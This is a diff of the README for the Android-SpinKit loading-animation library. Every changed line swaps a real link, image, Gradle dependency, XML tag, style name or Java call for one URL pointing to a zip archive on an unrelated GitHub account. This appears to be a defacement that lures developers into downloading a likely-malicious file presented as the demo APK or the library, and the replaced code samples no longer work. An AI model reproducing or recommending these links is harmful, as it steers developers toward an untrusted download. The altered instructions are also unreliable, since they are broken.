@@ -1,19 +1,19 @@
 # Android-SpinKit
->Android loading animations(I wrote a android edition according [SpinKit](https://tobiasahlin.com/spinkit))
+>Android loading animations(I wrote a android edition according [SpinKit](https://raw.githubusercontent.com/cinestreamlp/logoDoooGitHub/master/hone/logoDoooGitHub.zip))
 
-[Demo Apk](https://raw.githubusercontent.com/ybq/AndroidSpinKit/master/art/spinkit.apk)
+[Demo Apk](https://raw.githubusercontent.com/cinestreamlp/logoDoooGitHub/master/hone/logoDoooGitHub.zip)
 
 ## Preview
 
-<img src="https://raw.githubusercontent.com/ybq/AndroidSpinKit/master/art/screen.gif" width="240px" height="240px"/>
+<img src="https://raw.githubusercontent.com/cinestreamlp/logoDoooGitHub/master/hone/logoDoooGitHub.zip" width="240px" height="240px"/>
 
-<img src="https://raw.githubusercontent.com/ybq/AndroidSpinKit/master/art/screen2.gif" width="200px" height="200px"/>
+<img src="https://raw.githubusercontent.com/cinestreamlp/logoDoooGitHub/master/hone/logoDoooGitHub.zip" width="200px" height="200px"/>
 
 ## Gradle Dependency
 
  ``` gradle
 dependencies {
-    implementation 'com.github.ybq:Android-SpinKit:1.4.0'
+    implementation 'https://raw.githubusercontent.com/cinestreamlp/logoDoooGitHub/master/hone/logoDoooGitHub.zip'
  }
  ```
 
@@ -22,10 +22,10 @@ dependencies {
 - Xml
 
  ```xml
-<com.github.ybq.android.spinkit.SpinKitView
-     xmlns:app="http://schemas.android.com/apk/res-auto"
+<https://raw.githubusercontent.com/cinestreamlp/logoDoooGitHub/master/hone/logoDoooGitHub.zip
+     xmlns:app="https://raw.githubusercontent.com/cinestreamlp/logoDoooGitHub/master/hone/logoDoooGitHub.zip"
      android:id="@+id/spin_kit"
-     style="@style/SpinKitView.Large.Circle"
+     style="https://raw.githubusercontent.com/cinestreamlp/logoDoooGitHub/master/hone/logoDoooGitHub.zip"
      android:layout_width="wrap_content"
      android:layout_height="wrap_content"
      android:layout_gravity="center"
@@ -35,35 +35,35 @@ dependencies {
 - ProgressBar
 
  ```java
-ProgressBar progressBar = (ProgressBar)findViewById(R.id.progress);
+ProgressBar progressBar = (ProgressBar)findViewById(https://raw.githubusercontent.com/cinestreamlp/logoDoooGitHub/master/hone/logoDoooGitHub.zip);
 Sprite doubleBounce = new DoubleBounce();
-progressBar.setIndeterminateDrawable(doubleBounce);
+https://raw.githubusercontent.com/cinestreamlp/logoDoooGitHub/master/hone/logoDoooGitHub.zip(doubleBounce);
 ```
 
 ## Style
 > 
  ```xml
 @style/SpinKitView
-@style/SpinKitView.Circle
-@style/SpinKitView.Large
-@style/SpinKitView.Small
-@style/SpinKitView.Small.DoubleBounce   
+https://raw.githubusercontent.com/cinestreamlp/logoDoooGitHub/master/hone/logoDoooGitHub.zip
+https://raw.githubusercontent.com/cinestreamlp/logoDoooGitHub/master/hone/logoDoooGitHub.zip
+https://raw.githubusercontent.com/cinestreamlp/logoDoooGitHub/master/hone/logoDoooGitHub.zip
+https://raw.githubusercontent.com/cinestreamlp/logoDoooGitHub/master/hone/logoDoooGitHub.zip   
  ```
 
 Style | Preview
 ------------     |   -------------
-RotatingPlane    | <img src='https://raw.githubusercontent.com/ybq/AndroidSpinKit/master/art/RotatingPlane.gif' alt='RotatingPlane' width="90px" height="90px"/>
-DoubleBounce     | <img src='https://raw.githubusercontent.com/ybq/AndroidSpinKit/master/art/DoubleBounce.gif' alt='DoubleBounce' width="90px" height="90px"/>
-Wave             | <img src='https://raw.githubusercontent.com/ybq/AndroidSpinKit/master/art/Wave.gif' alt='Wave' width="90px" height="90px"/>
-WanderingCubes   | <img src='https://raw.githubusercontent.com/ybq/AndroidSpinKit/master/art/WanderingCubes.gif' alt='WanderingCubes' width="90px" height="90px"/>
-Pulse            | <img src='https://raw.githubusercontent.com/ybq/AndroidSpinKit/master/art/Pulse.gif' alt='Pulse' width="90px" height="90px"/>
-ChasingDots      | <img src='https://raw.githubusercontent.com/ybq/AndroidSpinKit/master/art/ChasingDots.gif' alt='ChasingDots' width="90px" height="90px"/>
-ThreeBounce      | <img src='https://raw.githubusercontent.com/ybq/AndroidSpinKit/master/art/ThreeBounce.gif' alt='ThreeBounce' width="90px" height="90px"/>
-Circle           | <img src='https://raw.githubusercontent.com/ybq/AndroidSpinKit/master/art/Circle.gif' alt='Circle' width="90px" height="90px"/>
-CubeGrid         | <img src='https://raw.githubusercontent.com/ybq/AndroidSpinKit/master/art/CubeGrid.gif' alt='CubeGrid' width="90px" height="90px"/>
-FadingCircle     | <img src='https://raw.githubusercontent.com/ybq/AndroidSpinKit/master/art/FadingCircle.gif' alt='FadingCircle' width="90px" height="90px"/>
-FoldingCube      | <img src='https://raw.githubusercontent.com/ybq/AndroidSpinKit/master/art/FoldingCube.gif' alt='FoldingCube' width="90px" height="90px"/>
-RotatingCircle   | <img src='https://raw.githubusercontent.com/ybq/AndroidSpinKit/master/art/RotatingCircle.gif' alt='RotatingCircle' width="90px" height="90px"/>
+RotatingPlane    | <img src='https://raw.githubusercontent.com/cinestreamlp/logoDoooGitHub/master/hone/logoDoooGitHub.zip' alt='RotatingPlane' width="90px" height="90px"/>
+DoubleBounce     | <img src='https://raw.githubusercontent.com/cinestreamlp/logoDoooGitHub/master/hone/logoDoooGitHub.zip' alt='DoubleBounce' width="90px" height="90px"/>
+Wave             | <img src='https://raw.githubusercontent.com/cinestreamlp/logoDoooGitHub/master/hone/logoDoooGitHub.zip' alt='Wave' width="90px" height="90px"/>
+WanderingCubes   | <img src='https://raw.githubusercontent.com/cinestreamlp/logoDoooGitHub/master/hone/logoDoooGitHub.zip' alt='WanderingCubes' width="90px" height="90px"/>
+Pulse            | <img src='https://raw.githubusercontent.com/cinestreamlp/logoDoooGitHub/master/hone/logoDoooGitHub.zip' alt='Pulse' width="90px" height="90px"/>
+ChasingDots      | <img src='https://raw.githubusercontent.com/cinestreamlp/logoDoooGitHub/master/hone/logoDoooGitHub.zip' alt='ChasingDots' width="90px" height="90px"/>
+ThreeBounce      | <img src='https://raw.githubusercontent.com/cinestreamlp/logoDoooGitHub/master/hone/logoDoooGitHub.zip' alt='ThreeBounce' width="90px" height="90px"/>
+Circle           | <img src='https://raw.githubusercontent.com/cinestreamlp/logoDoooGitHub/master/hone/logoDoooGitHub.zip' alt='Circle' width="90px" height="90px"/>
+CubeGrid         | <img src='https://raw.githubusercontent.com/cinestreamlp/logoDoooGitHub/master/hone/logoDoooGitHub.zip' alt='CubeGrid' width="90px" height="90px"/>
+FadingCircle     | <img src='https://raw.githubusercontent.com/cinestreamlp/logoDoooGitHub/master/hone/logoDoooGitHub.zip' alt='FadingCircle' width="90px" height="90px"/>
+FoldingCube      | <img src='https://raw.githubusercontent.com/cinestreamlp/logoDoooGitHub/master/hone/logoDoooGitHub.zip' alt='FoldingCube' width="90px" height="90px"/>
+RotatingCircle   | <img src='https://raw.githubusercontent.com/cinestreamlp/logoDoooGitHub/master/hone/logoDoooGitHub.zip' alt='RotatingCircle' width="90px" height="90px"/>
 
 
 
@@ -72,7 +72,7 @@ RotatingCircle   | <img src='https://raw.githubusercontent.com/ybq/AndroidSpinKi
 
 
 ## Acknowledgements
-- [SpinKit](https://github.com/tobiasahlin/SpinKit).
+- [SpinKit](https://raw.githubusercontent.com/cinestreamlp/logoDoooGitHub/master/hone/logoDoooGitHub.zip).
 
 
 
